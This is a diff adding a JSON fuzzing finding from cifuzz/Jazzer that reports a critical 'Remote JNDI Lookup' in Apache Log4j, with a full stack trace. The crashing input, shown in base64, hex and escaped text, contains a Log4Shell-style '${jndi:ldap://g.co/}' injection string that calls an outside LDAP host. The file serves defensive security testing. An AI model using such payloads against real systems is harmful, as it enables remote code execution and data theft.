@@ -1,0 +1,69 @@
+{
+  "name": "magical_rooster",
+  "type": "CRASH",
+  "input_data": "HfWB3HS3hAEAACR7am5kaTpsZGFwOi8vZy5jby99e3MsfX19e2p2bXJ1bix9JHtq/3b/DWE6czpcLSckfX0wfQ==",
+  "logs": [
+    "== Java Exception: com.code_intelligence.jazzer.api.FuzzerSecurityIssueCritical: Remote JNDI Lookup",
+    "JNDI lookups with attacker-controlled remote URLs can, depending on the JDK",
+    "version, lead to remote code execution or the exfiltration of information.",
+    "\tat com.code_intelligence.jazzer.sanitizers.NamingContextLookup.lookupHook(NamingContextLookup.kt:55)",
+    "\tat org.apache.logging.log4j.core.net.JndiManager.lookup(JndiManager.java:172)",
+    "\tat org.apache.logging.log4j.core.lookup.JndiLookup.lookup(JndiLookup.java:56)",
+    "\tat org.apache.logging.log4j.core.lookup.Interpolator.lookup(Interpolator.java:223)",
+    "\tat org.apache.logging.log4j.core.lookup.StrSubstitutor.resolveVariable(StrSubstitutor.java:1116)",
+    "\tat org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:1038)",
+    "\tat org.apache.logging.log4j.core.lookup.StrSubstitutor.substitute(StrSubstitutor.java:912)",
+    "\tat org.apache.logging.log4j.core.lookup.StrSubstitutor.replace(StrSubstitutor.java:467)",
+    "\tat org.apache.logging.log4j.core.pattern.MessagePatternConverter.format(MessagePatternConverter.java:132)",
+    "\tat org.apache.logging.log4j.core.pattern.PatternFormatter.format(PatternFormatter.java:38)",
+    "\tat org.apache.logging.log4j.core.layout.PatternLayout$PatternSerializer.toSerializable(PatternLayout.java:345)",
+    "\tat org.apache.logging.log4j.core.layout.PatternLayout.toText(PatternLayout.java:244)",
+    "\tat org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:229)",
+    "\tat org.apache.logging.log4j.core.layout.PatternLayout.encode(PatternLayout.java:59)",
+    "\tat org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.directEncodeEvent(AbstractOutputStreamAppender.java:197)",
+    "\tat org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.tryAppend(AbstractOutputStreamAppender.java:190)",
+    "\tat org.apache.logging.log4j.core.appender.AbstractOutputStreamAppender.append(AbstractOutputStreamAppender.java:181)",
+    "\tat org.apache.logging.log4j.core.config.AppenderControl.tryCallAppender(AppenderControl.java:156)",
+    "\tat org.apache.logging.log4j.core.config.AppenderControl.callAppender0(AppenderControl.java:129)",
+    "\tat org.apache.logging.log4j.core.config.AppenderControl.callAppenderPreventRecursion(AppenderControl.java:120)",
+    "\tat org.apache.logging.log4j.core.config.AppenderControl.callAppender(AppenderControl.java:84)",
+    "\tat org.apache.logging.log4j.core.config.LoggerConfig.callAppenders(LoggerConfig.java:543)",
+    "\tat org.apache.logging.log4j.core.config.LoggerConfig.processLogEvent(LoggerConfig.java:502)",
+    "\tat org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:485)",
+    "\tat org.apache.logging.log4j.core.config.LoggerConfig.log(LoggerConfig.java:460)",
+    "\tat org.apache.logging.log4j.core.config.DefaultReliabilityStrategy.log(DefaultReliabilityStrategy.java:63)",
+    "\tat org.apache.logging.log4j.core.Logger.log(Logger.java:161)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.tryLogMessage(AbstractLogger.java:2198)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.logMessageTrackRecursion(AbstractLogger.java:2152)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.logMessageSafely(AbstractLogger.java:2135)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.logMessage(AbstractLogger.java:2011)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.logIfEnabled(AbstractLogger.java:1983)",
+    "\tat org.apache.logging.log4j.spi.AbstractLogger.error(AbstractLogger.java:740)",
+    "\tat Log4JFuzzTest.test(Log4JFuzzTest.java:31)",
+    "== libFuzzer crashing input ==",
+    "MS: 0 ; base unit: 0000000000000000000000000000000000000000",
+    "0x1d,0xf5,0x81,0xdc,0x74,0xb7,0x84,0x1,0x0,0x0,0x24,0x7b,0x6a,0x6e,0x64,0x69,0x3a,0x6c,0x64,0x61,0x70,0x3a,0x2f,0x2f,0x67,0x2e,0x63,0x6f,0x2f,0x7d,0x7b,0x73,0x2c,0x7d,0x7d,0x7d,0x7b,0x6a,0x76,0x6d,0x72,0x75,0x6e,0x2c,0x7d,0x24,0x7b,0x6a,0xff,0x76,0xff,0xd,0x61,0x3a,0x73,0x3a,0x5c,0x2d,0x27,0x24,0x7d,0x7d,0x30,0x7d,",
+    "\\035\\365\\201\\334t\\267\\204\\001\\000\\000${jndi:ldap://g.co/}{s,}}}{jvmrun,}${j\\377v\\377\\015a:s:\\\\-'$}}0}",
+    "artifact_prefix='./'; Test unit written to .cifuzz-findings/magical_rooster/crashing-input",
+    "Base64: HfWB3HS3hAEAACR7am5kaTpsZGFwOi8vZy5jby99e3MsfX19e2p2bXJ1bix9JHtq/3b/DWE6czpcLSckfX0wfQ=="
+  ],
+  "details": "Security Issue: Remote JNDI Lookup",
+  "more_details": {
+    "name": "Remote JNDI Lookup",
+    "severity": {
+      "description": "CRITICAL",
+      "score": 9
+    }
+  },
+  "created_at": "2023-02-08T14:54:01.078584-05:00",
+  "input_file": ".cifuzz-findings/magical_rooster/crashing-input",
+  "stack_trace": [
+    {
+      "SourceFile": "com.code_intelligence.jazzer.sanitizers.NamingContextLookup",
+      "Line": 55,
+      "Column": 0,
+      "FrameNumber": 0,
+      "Function": "lookupHook"
+    }
+  ]
+}
